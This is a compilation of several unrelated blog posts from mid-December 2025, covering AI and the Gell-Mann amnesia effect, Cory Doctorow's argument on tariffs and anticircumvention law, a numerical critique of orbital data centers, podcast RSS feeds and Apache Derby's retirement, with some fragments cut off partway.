</code></pre>
<p>Since <code>poethepoet</code> is in the <code>dev=</code> dependency group any time I run <code>uv run ...</code> it will be available in the environment.</p>

      <h1>The “A” in “AI” Stands For Amnesia</h1>

(date: 2025-12-16)
      <p>
      <p><a href="https://blog.jim-nielsen.com/2025/uncomfortable-i-dont-know/">My last article</a> was blogging off <a href="https://adactio.com/links/22289">Jeremey’s article</a> which blogged off <a href="https://chriscoyier.net/2025/12/04/the-jeopardy-phenomenon/">Chris’ article</a> and, after publishing, a reader tipped me off to the <a href="https://en.wikipedia.org/wiki/Gell-Mann_amnesia_effect">Gell-Mann amnesia effect</a> which sounds an awful lot like Chris’ “Jeopardy Phenomenon”. Here’s Wikipedia:</p>
<blockquote>
<p>The Gell-Mann amnesia effect is a cognitive bias describing the tendency of individuals to critically assess media reports in a domain they are knowledgeable about, yet continue to trust reporting in other areas despite recognizing similar potential inaccuracies.</p>
</blockquote>
<p>According to Wikipedia, the concept was named by Michael Crichton because of conversation he once had with physicist Murray Gell-Mann (humorously, he said by associating a famous name to the concept he could imply greater importance to it — and himself — than otherwise possible).</p>
<p>Here’s Crichton:</p>
<blockquote>
<p>you read with exasperation or amusement the multiple errors in a story—and then turn the page to national or international affairs, and read with renewed interest as if the rest of the newspaper was somehow more accurate about far-off Palestine than it was about the story you just read. You turn the page, and forget what you know.</p>
</blockquote>
<p>He argues that this effect doesn’t seem to translate to other aspects of our lives. The courts, for example, have a related concept of <a href="https://en.wikipedia.org/wiki/Falsus_in_uno,_falsus_in_omnibus">“false in one thing, false in everything”</a>.</p>
<p>Even in ordinary life, Crichton says, “if somebody consistently exaggerates or lies to you, you soon discount everything they say”.</p>
<p>In other words: if your credibility takes a hit in one area, it’s gonna take a hit across the board.</p>
<p>At least, that’s his line of reasoning.</p>
<p>It’s kind of fascinating to think about this in our current moment of AI. Allow me to re-phrase Crichton.</p>
<p>You read with exasperation the multiple errors in AI’s “answer”, then start a new chat and read with renewed interest and faith as if the next “answer” is somehow more accurate than the last. You start a new prompt and forget what you know.</p>
<p>If a friend, acquaintance, or family member were to consistently exaggerate or lie to you, you’d quickly adopt a posture of discounting everything they say. But with AI — which even comes with a surgeon general’s warning, e.g. “AI can make mistakes. Check important info.” — we forgive and forget.</p>
<p>Forget. Maybe that’s the keyword for our behavior. It is for Crichton:</p>
<blockquote>
<p>The only possible explanation for our behavior is amnesia.</p>
</blockquote>

      <h1>Pluralistic: America's collapsing consumption is the world's disenshittification opportunity (16 Dec 2025)</h1>

(date: 2025-12-16)
      <p>
      <p>Today's links America's collapsing consumption is the world's disenshittification opportunity: America's loss is the post-American internet's gain. Hey look at this: Delights to delectate. Object permanence: DanKam; Backyard M*A*S*H; Blockchain voting is bullshit. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. America's collapsing consumption is the world's disenshittification opportunity (permalink) We are about to get a &quot;post-American internet,&quot; because we are entering a post-American era and a post-American world. Some of that is Trump's doing, and some of that is down to his predecessors. When we think about the American century, we rightly focus on America's hard power – the invasions, military bases, arms exports, and CIA coups. But it's America's soft power that established and maintained true American dominance, the &quot;weaponized interdependence&quot; that Henry Farrell and Abraham Newman describe in their 2023 book The Underground Empire: <a href="https://pluralistic.net/2023/10/10/weaponized-interdependence/#the-other-swifties">https://pluralistic.net/2023/10/10/weaponized-interdependence/#the-other-swifties</a> As Farrell and Newman lay out, America established itself as more than a global power – it is a global platform. If you want to buy things from another country, you use dollars, which you keep in an account at the US Federal Reserve, and which you exchange using the US-dominated SWIFT system. If you want to transmit data across a border, chances are you're use a fiber link that makes its first landfall on the USA, the global center of the world's hub-and-spoke telecoms system. No one serious truly believed that these US systems were entirely trustworthy, but there was always an assumption that if the US were to instrumentalize (or, less charitably, weaponize) the dollar, or fiber, that they would do so subtly, selectively, and judiciously. Instead, we got the Snowden revelations that the US was using its position in the center of the world's fiber web to spy on pretty much every person in the world – lords and peasants, presidents and peons. Instead, we got the US confiscating Argentina's foreign reserves to pay back American vulture capitalists who bought distressed Argentine bonds for pennies on the dollar and then got to raid a sovereign nation's treasury in order to recoup a loan they never issued. Instead we saw the SWIFT system mobilized to achieve tactical goals from the War on Terror and Russia-Ukraine sanctions. These systems are now no longer trustworthy. It's as though the world's brakes have started to fail intermittently, but we are still obliged to drive down the road at 100mph, desperately casting about for some other way to control the system, and forced to rely on this critical, unreliable mechanism while we do: <a href="https://pluralistic.net/2025/11/26/difficult-multipolarism/#eurostack">https://pluralistic.net/2025/11/26/difficult-multipolarism/#eurostack</a> This process was well underway before Trump, but Trump's incontinent belligerence has only accelerated the process – made us keenly aware that a sudden stop might be in our immediate future, heightening the urgency of finding some alternative to America's faulty brakes. Through trade policy (tariffs) and rhetoric, Trump has called the question: <a href="https://archive.is/WAMWI">https://archive.is/WAMWI</a> One of the most urgent questions Trump has forced the world to confront is what we will do about America's control over the internet. By this, I mean both the abstract &quot;governance&quot; control (such as the fact that ICANN is a US corporation, subject to US government coercion), and the material fact that virtually every government, large corporation, small business and household keeps its data (files, email, records) in a US Big Tech silo (also subject to US government control). When Trump and Microsoft colluded to shut down the International Criminal Court by killing its access to Outlook and Office365 (in retaliation for the ICC issuing an arrest warrant for the génocidaire Benjamin Netanyahu), the world took notice. Trump and Microsoft bricked the ICC, effectively shuttering its operations. If they could do that to the ICC, they could do it to any government agency, any nationally important corporation, any leader – anyone. It was an act of blatant cyberwarfare, no different from Russian hackers bricking Ukrainian power plants (except that Microsoft didn't have to hack Outlook, they own it). The move put teeth into Trump's frequent reminders that America no longer has allies or trading partners – it only has rivals and adversaries. That has been the subtext – and overt message – of the Trump tariffs, ever since &quot;liberation day&quot; on April 2, 2025. When Americans talk about the Trump tariffs, they focus on what these will do to the cost of living in the USA. When other countries discuss the tariffs, they focus on what this will do to their export markets, and whether their leaders will capitulate to America's absurd demands. This makes sense: America is gripped by a brutal cost of living crisis, and contrary to Trump's assertions, this is not a Democratic hoax. We know this because (as The Onion points out), &quot;Democrats would never run on a salient issue&quot;: <a href="https://theonion.com/fact-checking-trump-on-affordability/">https://theonion.com/fact-checking-trump-on-affordability/</a> It also makes sense that Canadians and Britons would focus on this because Prime Ministers Carney and Starmer have caved on their plans to tax US Big Tech, ensuring that these companies will always have a cash-basis advantage over domestic rivals (Starmer also rolled over by promising to allow American pharma companies to gouge the NHS): <a href="https://www.independent.co.uk/news/uk/politics/nhs-drug-prices-starmer-trump-tariffs-b2841490.html">https://www.independent.co.uk/news/uk/politics/nhs-drug-prices-starmer-trump-tariffs-b2841490.html</a> But there's another, highly salient aspect to tariffs that is much neglected – one that is, ultimately, far more important than these short-run changes to other countries' plans to tax American tech giants. Namely: for decades, the US has used the threat of tariffs to force its trading partners into policies that keep their tech companies from competing with American tech giants. The most important of these Big Tech-defending policy demands is something called &quot;anticircumvention law.&quot; This is a law that bans changing how a product works without the manufacturer's permission: for example, modifying your printer so it can use generic ink, or modifying your car so it can be fixed by an independent repair depot, or modifying your phone or games console so it can use a third-party app store. This ban on modification means that when a US tech giant uses its products to steal money and/or private information from the people in your country (that is, &quot;enshittification&quot;), no one is allowed to give your people the tools to escape these scams. Your domestic investors can't invest in your domestic technologists' startups, which cannot make the disenshittifying products that also cannot be exported globally, to anyone with an internet connection and a payment method. It's a double whammy: your people are plundered, and your businesses are strangled. The whole world has been made poorer, to the tune of trillions of dollars, by this scam. And the only reason everyone puts up with it is that the US threatened them with tariffs if they didn't. So now we have tariffs, and if someone threatens to burn your house down unless you follow orders, and then they burn it down anyway, you really don't have to keep following their orders. This is a point I've been making in many forums lately, including, most recently, on a stage in Canada, where I made the case that rather than whacking Americans with retaliatory tariffs, Canada should legalize reverse-engineering and go into business directly attacking the highest margin lines of business of America's most profitable corporations, making everything in Canada cheaper and better, and turning America's trillions in Big Tech ripoffs into Canadian billions by selling these tools to everyone else in the world: <a href="https://pluralistic.net/2025/11/28/disenshittification-nation/#post-american-internet">https://pluralistic.net/2025/11/28/disenshittification-nation/#post-american-internet</a> There's lots of reasons to like this plan. Not only is it a double reverse whammy – making everything cheaper and making billions for a new, globally important domestic tech sector – but it's also unambiguously within Canada's power to do. After all, it's very hard to get American tech giants to do things they don't want to do. Canada tried to do this with Facebook, and failed miserably: <a href="https://www.cbc.ca/radio/podcastnews/understood-who-broke-the-internet-episode-4-transcript-1.7615096">https://www.cbc.ca/radio/podcastnews/understood-who-broke-the-internet-episode-4-transcript-1.7615096</a> The EU – a far more powerful entity than Canada – has been trying to get Apple to open up its App Store, and Apple has repeatedly told them to go fuck themselves: <a href="https://pluralistic.net/2025/09/26/empty-threats/#500-million-affluent-consumers">https://pluralistic.net/2025/09/26/empty-threats/#500-million-affluent-consumers</a> Apple, being a truly innovative company, has come up with a whole lot of exciting new ways to tell the EU to fuck itself: <a href="https://www.theregister.com/2025/12/16/apple">https://www.theregister.com/2025/12/16/apple</a>_dma_complaint/ But anticircumvention law is something that every government has total, absolute control over. Maybe Canada can't order Apple, Google and Facebook to pay their taxes, but it can absolutely decide to stop giving these American companies access to Canada's courts to shut down Canadian competitors so that US companies can go on stealing data and money from the Canadian people: <a href="https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack">https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack</a> Funnily enough, this case is so convincing that I've started to hear from Canadian Trump appeasers who insist that we must not repeal our anticircumvention laws because this would work too well. It would inflict too much pain on America's looting tech sector, and save Canadians too much money, and make too much money for Canadian tech businesses. If Canada becomes the world's first disenshittification nation (they say), we will make Trump too angry. Apparently, these people think that Canada should confine its tariff response to measures that don't work, because anything effective would provoke Trump. When I try to draw these critics out about what the downside of &quot;provoking Trump&quot; is, they moot the possibility that Trump would roll tanks across the Rainbow Bridge and down Lundy's Lane. This seems a remote possibility to me – and ultimately, they agree. The international response to Trump invading Canada because we made it easier for people (including Americans) to buy cheap printer ink would be…intense. Next, they mumble something about tariffs. When I point out that the US is already imposing tariffs on Canadian exports, they say &quot;well, it could be worse,&quot; and point to various moments when Trump has hiked the tariffs on Canada, e.g. because he was angry over being reminded that Ronald Reagan would have hated his guts: <a href="https://www.youtube.com/watch?v=dCKmMEFiLrI">https://www.youtube.com/watch?v=dCKmMEFiLrI</a> But of course, the fact that Trump's tariffs yo-yo up and down depending on the progress of his white matter disease means that anyone trying to do forward planning for something they anticipate exporting to America should assume that there might be infinity tariffs the day they load up their shipping container. But there's another way in which the threat of tariffs is ringing increasingly hollow: American consumption power is collapsing, because billionaires and looters have hoarded all the country's wealth, and no one can afford to buy things anymore. America is in the grips of its third consecutive &quot;K-shaped recovery&quot;: <a href="https://prospect.org/2025/12/01/premiumization-plutonomy-middle-class-spending-gilded-age/">https://prospect.org/2025/12/01/premiumization-plutonomy-middle-class-spending-gilded-age/</a> A K-shaped recovery is when the richest people get richer, but everyone else gets worse off. Working people in America have gotten steadily poorer since the 1970s, even as America's wealthiest have seen their net worth skyrocket. The declining economic power of everyday Americans has multiple causes: stagnating wages, monopoly price-gouging, and the blistering increase in education, housing and medical debt. These all have the same underlying cause, of course: the capture of both political parties – and the courts and administrative agencies – by billionaires, who have neutered antitrust law, jacked up the price of health care and a college educaton, smashed unions, and cornered entire housing markets. For decades, America's consumption power has been kept on life-support through consumer debt and second (or third, or fourth) mortgages. But America's monopoly credit card companies are every bit as capable of price-gouging as America's hospitals, colleges and landlords are, and Americans don't just carry more credit-card debt than their foreign counterparts, they also pay more to service that debt: <a href="https://www.justice.gov/archives/opa/pr/justice-department-sues-visa-monopolizing-debit-markets">https://www.justice.gov/archives/opa/pr/justice-department-sues-visa-monopolizing-debit-markets</a> The point is that every dollar that goes into servicing a debt is a dollar that can't be used to buy something useful. A dollar spent on consumption has the potential to generate multiple, knock-on transactions, as the merchant spends your dollar on a coffee, and the coffee-shop owner spends it on a meal out, and the restaurateur spends it on a local printer who runs off a new set of menus. But a dollar that's shoveled into the debt markets is almost immediately transferred out of the real economy and into the speculative financial economy, landing in the pocket of a one-percenter who buys stocks or other assets with it. The rich just don't buy enough stuff. There's a limit to how many Lambos, Picassos, and Sub-Zero fridges even the most guillotineable plute can usefully own. Meanwhile, consumers keep having their consumption power siphoned off by debt-collectors and price-gougers, with Trump's help. The GOP just forced eight million student borrowers back into repayment: <a href="https://prospect.org/2025/12/16/gop-forcing-eight-million-student-loan-borrowers-into-repayment/">https://prospect.org/2025/12/16/gop-forcing-eight-million-student-loan-borrowers-into-repayment/</a> They've killed a monopolization case against Pepsi and Walmart for colluding to rig grocery prices across the entire economy: <a href="https://www.thebignewsletter.com/p/secret-documents-show-pepsi-and-walmart">https://www.thebignewsletter.com/p/secret-documents-show-pepsi-and-walmart</a> They've sanctioned the use of price-fixing algorithms to raise rent: <a href="https://www.thebignewsletter.com/p/an-odd-settlement-on-rent-fixing">https://www.thebignewsletter.com/p/an-odd-settlement-on-rent-fixing</a> As Tim Wu points out in his new book, The Age of Extraction, one consequence of allowing monopoly pricing is that it reduces spending power across the entire economy: <a href="https://www.penguinrandomhouse.com/books/691177/the-age-of-extraction-by-tim-wu/">https://www.penguinrandomhouse.com/books/691177/the-age-of-extraction-by-tim-wu/</a> Take electricity: you would probably pay your power bill even if it tripled. Sure, you'd find ways to conserve electricity and eliminate many discretionary power uses, but anyone who can pay for electricity will, if the alternative is no electricity. Electricity – like health, shelter, food, and education – is so essential that you'd forego a vacation, a new car, Christmas gifts, dinners out, a new winter coat, or a vet's visit for your cat if that was the only way to keep the lights on. Trump's unshakable class solidarity with rent extractors, debt collectors and price gougers has significantly accelerated the collapse of the consumption power of Americans (AKA &quot;the affordability crisis&quot;). But it gets worse: Americans' consumption power isn't limited to the dollars they spend, it also includes the dollars that the government spends on their behalf, through programs like SNAP (food stamps) and Medicaid/Medicare. Those programs have been slashed to the bone and beyond by Trump, Musk, DOGE and the Republican majority in Congress and the Senate. The reason that other countries took the threat of US tariffs so seriously – seriously enough to hamstring their own tech sector and render their own people defenseless against US tech – is that the US has historically bought a lot of stuff. For any export economy, the US was a critical market, a must-have. But that has been waning for a generation, as the Lambo-and-Sub-Zero set hoarded more and more of the wealth and the rest of us were able to afford less and less. In less than a year, Trump has slashed the consumption power of an increasing share of the American public to levels approaching the era of WWII ration-books. The remaining American economy is a collection of cheap gimmicks that are forever on the brink of falling apart. Most of the economy is propped up by building data-centers for AI that no one wants and that can't be powered thanks to Trump's attacks on renewables. The remainder consists of equal parts MLMs, Labubus, Lafufus, cryptocurrency speculation, and degenerate app-based gambling. None of this is good. This is all fucking terrible. But I raise it here to point out that &quot;Do as I say or Americans won't buy your stuff anymore&quot; starts to ring hollow once most Americans can't afford to buy anything anymore. America is running out of levers to pull in order to get the rest of the world to do its bidding. American fossil fuels are increasingly being outcompeted by an explosion of cheap, evergreen Chinese solar panels, inverters, batteries, and related technology: <a href="https://pluralistic.net/2025/10/02/there-goes-the-sun/#carbon-shifting">https://pluralistic.net/2025/10/02/there-goes-the-sun/#carbon-shifting</a> And the US can't exactly threaten to withhold foreign aid to get leverage over other countries – US foreign aid has dropped to homeopathic levels: <a href="https://www.factcheck.org/2025/02/sorting-out-the-facts-on-waste-and-abuse-at-usaid/">https://www.factcheck.org/2025/02/sorting-out-the-facts-on-waste-and-abuse-at-usaid/</a> What's more, it's gonna be increasingly difficult for the US to roll tanks anywhere, even across the Rainbow Bridge, now that Pete Hegseth is purging the troops of anyone who can't afford Ozempic: <a href="https://www.militarytimes.com/news/pentagon-congress/2025/09/30/hegseth-blasts-fat-troops-in-rare-gathering-with-military-brass/">https://www.militarytimes.com/news/pentagon-congress/2025/09/30/hegseth-blasts-fat-troops-in-rare-gathering-with-military-brass/</a> And Congress just gutted the US military's Right to Repair, meaning that the Pentagon will be forced to continue its proud tradition of shipping busted generators, vehicles and materiel back to the USA for repair: <a href="https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/">https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/</a> Eventually, some foreign government is going to wake up to the fact that they can make billions by raiding the US tech giants that have been draining their economy, and, in so doing, defend themselves against Trump's cyberwar threat to order Microsoft (or Oracle, or Apple, or Google) to brick their key ministries and corporations. When they do, US Big Tech will squeal, the way they always do: <a href="https://economicpopulist.substack.com/p/big-tech-zeal-to-weaponize-trade">https://economicpopulist.substack.com/p/big-tech-zeal-to-weaponize-trade</a> But money talks and bullshit walks. There's a generation of shit-hot technologists who've been chased out of America by mask-wearing ICE goons who wanted to throw them in a gulag, and a massive cohort of investors looking for alpha who don't want to have to budget for a monthly $TRUMP coin spend in order to remain in business. And when we do finally get a disenshittification nation, it will be great news for Americans. After all, everyday Americans either own no stock, or so little stock as to be indistinguishable from no stock. We don't benefit from US tech companies' ripoffs – we are the victims of those ripoffs. America is ground zero for every terrible scam and privacy invasion that a US tech giant can conceive of. No one needs the disenshittification tools that let us avoid surveillance, rent-seeking and extraction more than Americans. And once someone else goes into business selling them, we'll be able to buy them. Buying digital tools that are delivered over the internet is a hell of a lot simpler than buying cheap medicine online and getting it shipped from a Canadian pharmacy.

The AI bubble has been kept inflated by journalists uncritically reporting whatever CEOs say as they frantically pump the stock. Right now, you can observe a wonderful example of this by searching the Web for &quot;orbital data centers&quot;. My recent search turned up pages of links, including <a href="https://www.bloomberg.com/news/articles/2025-12-11/spacex-1-5-trillion-value-target-hinges-on-starlink-and-elon"><em>SpaceX’s Lofty IPO Valuation Hinges on Big Bet on Outsize Growth</em></a> from Bloomberg's Bailey Lipschultz, Sana Pashankar, and Loren Grush:</p>
<blockquote>
<p>To buy into SpaceX’s audacious $1.5 trillion valuation in a listing next year, investors will need to have faith in Elon Musk’s equally galactic vision for his rocket and satellite maker, from orbital data centers to lunar factories to human settlements on Mars.</p>
</blockquote>
<p>I chose one that ought to be more credible than Musk from <em>Scientific American</em>. Jeremy Hsu's <a href="https://www.scientificamerican.com/article/data-centers-in-space/"><em>Data Centers in Space Aren’t as Wild as They Sound</em></a> reports that:</p>
<blockquote>
<p>In early November Google announced Project Suncatcher, which aims to launch solar-powered satellite constellations carrying its specialty AI chips, with a demonstration mission planned for 2027. Around the same time, the start-up Starcloud celebrated the launch of a 60-kilogram satellite with an NVIDIA H100 GPU as a prelude to an orbital data center that is expected to require five gigawatts of electric power by 2035.</p>
</blockquote>
<p>To do Hsu justice, he did point out a few of the problems. But follow me below the fold for more.</p>
<p>A couple of weeks ago an anonymous engineer posted <a href="https://taranis.ie/datacenters-in-space-are-a-terrible-horrible-no-good-idea/"><em>Datacenters in space are a terrible, horrible, no good idea</em></a>:</p>
<blockquote>
<p>In the interests of clarity, I am a former NASA engineer/scientist with a PhD in space electronics. I also worked at Google for 10 years, in various parts of the company including YouTube and the bit of Cloud responsible for deploying AI capacity, so I'm quite well placed to have an opinion here.</p>
<p>The short version: this is an absolutely terrible idea, and really makes zero sense whatsoever. There are multiple reasons for this, but they all amount to saying that the kind of electronics needed to make a datacenter work, particularly a datacenter deploying AI capacity in the form of GPUs and TPUs, is exactly the opposite of what works in space. If you've not worked specifically in this area before, I'll caution against making gut assumptions, because the reality of making space hardware actually function in space is not necessarily intuitively obvious.</p>
</blockquote>
<p>You should absolutely read the whole thing, it is magnificent. I don't have this background, but I don't need it to know that they are a terrible idea. All I need is arithmetic.</p>
<p>Steven Clark reports that <a href="https://arstechnica.com/science/2025/12/investors-commit-quarter-billion-dollars-to-startup-designing-giga-satellites/"><em>Investors commit quarter-billion dollars to startup designing “Giga” satellites</em></a>:</p>
<blockquote>
<p>K2 is designing two classes of satellites—Mega and Giga .... The company’s first “Mega Class” satellite is named Gravitas. Gravitas will also deploy twin solar arrays capable of generating 20 kilowatts of power.</p>
<p>...</p>
<p>K2 says Gravitas is “on par with the largest satellites that have ever been produced.” But K2 won’t stop there. The firm’s next satellite iteration, known as Giga, .... Underpinning Giga is its ability to generate up to 100 kilowatts of power per satellite ... Examples of missions Giga can support include AI computing</p>
</blockquote>
<p>Gravitas can launch on a Falcon 9, but Giga-class satellites need Starship. In <a href="https://www.theregister.com/2025/11/15/power_supercomputing/"><em>Power: The answer to and source of all your AI datacenter problems</em></a> Tobias Mann reports that:</p>
<blockquote>
<p>Today, Nvidia's rack systems are hovering around 140kW in compute capacity. But we've yet to reach a limit. By 2027, Nvidia plans to launch 600kW racks which pack 576 GPU dies into the space once occupied by just 32.</p>
</blockquote>
<p>So the largest satellites ever can power 14% of a current Nvidia rack. The next generation that requires Starship to launch can power 70% of a current Nvidia rack. By the time they can launch it, it will power 17% of a contemporary Nvidia rack. See, progress!</p>
<p>Starcloud's &quot;5GW&quot; satellite could power over 8000 2027 Nvidia racks in 2035 but it would be 50,000 times larger than a satellite that is much larger than one &quot;on par with the largest satellites that have ever been produced&quot;.</p>
<p>The next question is &quot;How many racks does one data center hold?&quot; Yasir Shinaishin of ABB wrote in<a href="https://electrification.us.abb.com/sites/default/files/2024-07/5874-ABB_RackDensity_Article_BMF_1.0-1.pdf"><em>New Strategies in Design to Meet the Demands of AI Data Centers</em></a>:</p>
<blockquote>
<p>It is not uncommon to see data centers of 1 GW with liquid-cooled racks with densities over 100 kW.</p>
</blockquote>
<p>Say 7,000 current Nvidia racks. So they need 10,000 Giga-class satellites to match one 2025 data center. Lets say they start launching in 2027 and launch 100 satellites/year. They can match one 2025 data center in 2127. Maybe the AI bubble will have burst by then...</p>

But the useful life of the racks in earth-bound data centers is <a href="https://blog.dshr.org/2025/10/depreciation.html">less that 5 years</a>. In space the chips are subject to high levels of radiation, which as the anonymous engineer explains, is <a href="https://taranis.ie/datacenters-in-space-are-a-terrible-horrible-no-good-idea/">bad news</a>:</p>
<blockquote>
<p>For longer duration missions, which would be the case with space based datacenters because they would be so expensive that they would have to fly for a long time in order to be economically viable, it's also necessary to consider total dose effects. Over time, the performance of chips in space degrades, because repeated particle impacts make the tiny field-effect transistors switch more slowly and turn on and off less completely. In practice, this causes maximum viable clock rates to decay over time, and for power consumption to increase.</p>
</blockquote>
<p>But lets ignore that and asume a useful life of 5 years. Thus to keep one 2025 data center operating in space they need to launch 2000 enormous satellites per year, or over <em>5 per day</em>. It is true that solar power in space is free, but launches aren't. Adding the cost of 10,000 launches to the cost of replacing the 60% of the cost of the data center that is the racks is going to make the already impossible <a href="https://blog.dshr.org/2025/12/mind-gaap.html">economics of AI</a> orders of magnitude worse.</p>
<p>That is not to mention that they will be burning vast amounts of fuel and burning up more than 5 huge satellites a day in the upper atmosphere, which would cause vastly more pollution and damage to the ozone layer than described in <a href="https://www.nature.com/articles/s41597-024-03910-z"><em>Global 3D rocket launch and re-entry air pollutant and CO2 emissions at the onset of the megaconstellation era</em></a> by Barker <em>et al</em> or <a href="https://www.nature.com/articles/s41612-025-01098-6"><em>Near-future rocket launches could slow ozone recovery</em></a> by Revell <em>et al</em>.</p>

<p>But even that isn't the biggest problem. In <a href="https://arxiv.org/abs/2512.09643"><em>An Orbital House of Cards: Frequent Megaconstellation Close Conjunctions</em></a> Thiele <em>et al</em> show that we are close to the <a href="https://en.wikipedia.org/wiki/Kessler_syndrome">Kessler syndrome</a>:</p>
<blockquote>
<p>Here we propose a new metric, the CRASH Clock, that measures such stress in terms of the time it takes for a catastrophic collision to occur if there are no collision avoidance manoeuvres or there is a severe loss in situational awareness. Our calculations show the CRASH Clock is currently 2.8 days, which suggests there is now little time to recover from a wide-spread disruptive event, such as a solar storm. This is in stark contrast to the pre-megaconstellation era: in 2018, the CRASH Clock was 121 days.</p>
</blockquote>
<p>Co-author Prof. Lawler <a href="https://mastodon.social/@sundogplanets/115701447682658918">wrote</a>:</p>
<blockquote>
<p>One of the scariest parts of this project was learning more about Starlink's orbital operations. I had always assumed they had some kind of clever configuration of the satellites in the orbital shell that minimized conjunctions, and we would see the number of conjunctions grow over time in our simulations. But no! It's just random! There's no magic here, it's just avoiding collisions by moving a Starlink satellite every 2 minutes. This is bad.</p>
</blockquote>
<p>Even if we haven't rendered low earth orbit unusable in the next few years, a constellation of 10,000 huge satellites in low earth orbit would rapidly self-destruct and guarantee humanity lost access to space.</p>
<p>What are these investors smoking?</p>

      <p>A heavy mist fell as we stood before Jane Austen’s cottage. Pink roses climbed the bricks. Dresses hung on a line in the courtyard. Though tiny, the cottage is a world-class museum, lovingly restored. Inside, the mood was hushed, reverent.</p>

      <p>I’ve been feeling pretty mad about capitalism lately. One of the core things I’ve been angry about is realizing that capitalism is a huge source of “shoulds” and fake productivity.

      <p>I wrote, in a <a href="https://bsky.app/profile/did:plc:oety7qbfx7x6exn2ytrwikmr/post/3ma3xjpzmos2z">reply</a> to Ben Werdmuller on Bluesky: &quot;I’ve had 66K followers on Twitter for many years, but when I post something there it gets 250 views, not even sure what that means. These days all I use it for is communicating with insiders on certain tech platforms, and even that is kind of empty. Pretty much the same in Bluesky too, btw.&quot;</p>
<p>I was going to write a reply, but it got too long (300 char limit), so I put it here and posted a <a href="https://bsky.app/profile/scripting.com/post/3ma47waav4k2t">link</a> on Bluesky.</p>

<li>Ben, I think we have to create our own social web.</li>
<li>We've been like <a href="https://en.wikipedia.org/wiki/Blanche_DuBois">Blanche DuBois</a> in <a href="https://en.wikipedia.org/wiki/A_Streetcar_Named_Desire">Streetcar Named Desire</a> for too long, always depending on the kindness of strangers.</li>
<li>None of the candidates for the Social Web Prize are actually <a href="http://scripting.com/2025/11/24/141418.html">of the web</a>. But one certainly is possible. You could create one, I could create one, Manton could too -- and they would all be the same network.</li>
<li>That's how you'll know it's the web, when we get choice, and any developer with an idea can create their own version of the social web, and interop with all the others. That was the promise <a href="http://scripting.com/2025/11/24/141418.html">of the web</a>. The platform with no <a href="http://scripting.com/2025/01/31/152641.html">platform vendor</a>.</li>
<li>We don't have to agree on very much, just what is a post, beyond the limits imposed by twitter-like systems, and a simple way to share them using HTTP and really simple RSS.</li>

(date: 2025-12-16)
      <p>
      <p>American presidents occasionally perform roles that extend well beyond the formal obligations of their office. Thomas Jefferson’s tenure (1801–1809) embodied the broader progress of antebellum southern agrarian power, while Abraham Lincoln’s term (1861–1865) anticipated the growth of postbellum northern industrial</p>

      <p>Maureen has written <a href="https://htmhell.dev/adventcalendar/2025/14/">a really good overview of web feeds</a> for this year’s HTMHell advent calendar.</p>
<p>The common belief is that nobody uses RSS feeds these days. And while it’s true that I wish more people used feed readers— <a href="https://www.citationneeded.news/curate-with-rss/">the perfect antidote to being fed from an algorithm</a>—the truth is that millions of people use RSS feeds every time they listen to a podcast. That’s what a podcast is: an RSS feed with <code>enclosure</code> elements that point to audio files.</p>
<p>And just as a web feed doesn’t necessarily need to represent a list of blog posts, a podcast doesn’t necessarily need to be two or more people having a recorded conversation (though that does seem to be the most common format). A podcast can tell a story. I like those kinds of podcasts.</p>
<p>The BBC are particularly good at this kind of episodic audio storytelling. I really enjoyed their series <a href="https://www.bbc.co.uk/programmes/p083t547">Thirteen minutes to the moon</a>, all about the Apollo 11 mission. They followed it up with <a href="https://www.bbc.co.uk/programmes/p083wp70">a series on Apollo 13</a>, and most recently, <a href="https://www.bbc.co.uk/programmes/p0lq7254">a series on the space shuttle</a>.</p>
<p><a href="https://podcasts.files.bbci.co.uk/w13xttx2.rss">Here’s the RSS feed for the 13 minutes podcast</a>.</p>
<p>Right now, the BBC have an ongoing series about <a href="https://www.bbc.co.uk/programmes/p08llv8n/episodes/downloads">the history of the atomic bomb</a>. The first series was about Leo Szilard, the second series was about Klaus Fuchs, and the third series running right now is about the Cuban missile crisis.</p>
<p>The hook is that each series is presented by people with a family connection to the events. The first series is presented by the granddaughter of one of the Oak Ridge scientists. The second series is presented by the granddaughter of Klaus Fuch’s spy handler in the UK—blimey! And the current series is presented by Nina Khrushcheva and Max Kennedy—double blimey!</p>
<p><a href="https://podcasts.files.bbci.co.uk/p08llv8n.rss">Here’s the RSS feed for The Bomb podcast</a>.</p>
<p>If you want a really deep dive into another pivotal twentieth century event, Evgeny Morozov made a podcast all about Stafford Beer and Salvadore Allende’s collaboration on cybernetics in Chile, the fabled <a href="https://en.wikipedia.org/wiki/Project_Cybersyn">Project Cybercyn</a>. It’s fascinating stuff, though there’s an inevitable feeling of dread hanging over events because we know how this ends.</p>
<p>The podcast is called <a href="https://www.the-santiago-boys.com/">The Santiago Boys</a>, though I almost hesitate to call it a podcast because for some reason, the website does its best to hide the RSS feed, linking only to the silos of Spotify and Apple. Fortunately, thanks to <a href="https://getrssfeed.com/">this handy tool</a>, I can say:</p>
<p><a href="https://feeds.megaphone.fm/BCS4655242240">Here’s the RSS feed for The Santiago Boys podcast</a>.</p>
<p>The unifying force behind all three of these stories is the cold war:</p>
<ul>
<li><a href="https://www.bbc.co.uk/programmes/w13xttx2">13 Minutes</a>—the space race, from the perspective of the United States.</li>
<li><a href="https://www.bbc.co.uk/programmes/p08llv8n">The Bomb</a>—the nuclear arms race, from Los Alamos to Cuba.</li>
<li><a href="https://www.the-santiago-boys.com/">The Santiago Boys</a>—the CIA-backed overthrow of a socialist democracy in Chile.</li>

(date: 2025-12-16)
      <p>
      <h1>Adieu Apache Derby, Welcome DuckDB</h1>
<p>Apache Derby was once a popular system to mock an SQL-Engine during unit tests. A use-case that vanished by the ease of which “the real SQL systems” are available during development nowadays. Thus, the following note might be sad, but nor surprising: “ <a href="https://db.apache.org/derby/">On 2025-10-10, the Derby developers voted to retire the project into a read-only state. Derby development and bug-fixing have ended. No further releases will be published</a>”. Consequently, I’ve removed Apache Derby from the charts on <a href="https://modern-sql.com/">modern-sql.com</a>.</p>
